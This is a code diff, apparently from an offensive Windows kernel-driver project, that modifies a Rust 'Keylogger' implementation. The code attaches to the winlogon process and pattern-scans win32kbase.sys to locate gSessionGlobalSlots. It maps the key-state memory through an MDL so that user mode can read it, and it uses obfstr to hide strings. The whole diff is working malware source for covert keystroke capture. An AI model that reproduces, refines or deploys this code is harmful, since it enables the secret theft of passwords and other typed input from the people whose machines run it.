@@ -1,4 +1,4 @@
-use core::{ffi::c_void, ptr::null_mut};
+use core::{ffi::c_void, ptr::null_mut, slice};
 use obfstr::obfstr;
 use wdk_sys::{
     _MEMORY_CACHING_TYPE::MmCached, _MM_PAGE_PRIORITY::NormalPagePriority, _MODE::UserMode,
@@ -122,7 +122,7 @@ impl Keylogger {
         let _attach_guard = ProcessAttach::new(winlogon_process.e_process);
     
         // Retrieve the address of gSessionGlobalSlots (instead of gafAsyncKeyState)
-        let session_globals_address = Self::get_sessionglobals_address()?;
+        let session_globals_address = Self::get_session_globals_address()?;
         log::info!("get_user_address_keylogger: Retrieved gSessionGlobalSlots at {:p}", session_globals_address);
     
         // Allocate an MDL for the region (adjust size as needed)
@@ -131,7 +131,7 @@ impl Keylogger {
             core::mem::size_of::<[u8; 64]>() as u32,
             0,
             0,
-            core::ptr::null_mut(),
+            null_mut(),
         );
         if mdl.is_null() {
             return Err(ShadowError::FunctionExecutionFailed("IoAllocateMdl", line!()));
@@ -163,21 +163,47 @@ impl Keylogger {
     ///
     /// * `Ok(*mut u8)` - Returns a pointer to the `gafAsyncKeyState` array if found.
     /// * `Err(ShadowError)` - If the array is not found or an error occurs during the search.
-    unsafe fn get_sessionglobals_address() -> Result<*mut u8> {
-        // Get the base address of win32kbase.sys
+    pub unsafe fn get_session_globals_address() -> Result<*mut u8> {
+        // Get the base address of win32kbase.sys.
         let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;
-        // Get the address of the W32GetSessionStateForSession function
-        let function_address = get_function_address(obfstr!("W32GetSessionStateForSession"), module_address)?;
-        log::info!("get_sessionglobals_address: W32GetSessionStateForSession at {:p}", function_address);
-    
-        // Define the pattern that identifies the instruction loading gSessionGlobalSlots.
-        // In W32GetSessionStateForSession+0x14, you see an instruction like:
-        //   488b05e1cf0600  mov rax, qword ptr [win32k!gSessionGlobalSlots]
-        // We’ll use the first three bytes ("48 8B 05") as our pattern.
-        const SESSION_GLOBALS_PATTERN: [u8; 3] = [0x48, 0x8B, 0x05];
-        // Use scan_for_pattern with chosen parameters (offset=3, final_offset=7, search size=0x100)
-        let address = scan_for_pattern(function_address, &SESSION_GLOBALS_PATTERN, 3, 7, 0x100)?;
-        log::info!("get_sessionglobals_address: Pattern found; computed address: {:p}", address);
-        Ok(address)
+        
+        // Retrieve the address of the exported function "W32GetSessionStateForSession".
+        let function_address =
+            get_function_address(obfstr!("W32GetSessionStateForSession"), module_address)?;
+        
+        log::info!(
+            "get_session_globals_address: W32GetSessionStateForSession found at {:p}",
+            function_address
+        );
+        
+        // Define the pattern to search for: the 3-byte opcode for "mov rax, [rip+imm32]"
+        let pattern: [u8; 3] = [0x48, 0x8B, 0x05];
+        let scan_size = 0x100; // Scan the first 0x100 bytes of the function.
+        let function_bytes = slice::from_raw_parts(function_address as *const u8, scan_size);
+        
+        if let Some(pos) = function_bytes.windows(pattern.len()).position(|window| window == pattern) {
+            // The instruction is 7 bytes long: 3 bytes opcode + 4 bytes immediate.
+            let imm_offset = pos + pattern.len();
+            if imm_offset + 4 > scan_size {
+                return Err(ShadowError::PatternNotFound);
+            }
+            // Read the immediate value (the displacement) as a little-endian i32.
+            let imm_bytes = &function_bytes[imm_offset..imm_offset + 4];
+            let displacement = i32::from_le_bytes(imm_bytes.try_into().unwrap()) as isize;
+            
+            // The RIP for this instruction is the address after the 7-byte instruction.
+            let rip = (function_address as usize)
+                .wrapping_add(pos)
+                .wrapping_add(7);
+            let target_address = (rip as isize).wrapping_add(displacement) as *mut u8;
+            
+            log::info!(
+                "get_session_globals_address: Found gSessionGlobalSlots at {:p}",
+                target_address
+            );
+            Ok(target_address)
+        } else {
+            Err(ShadowError::PatternNotFound)
+        }
     }
 }
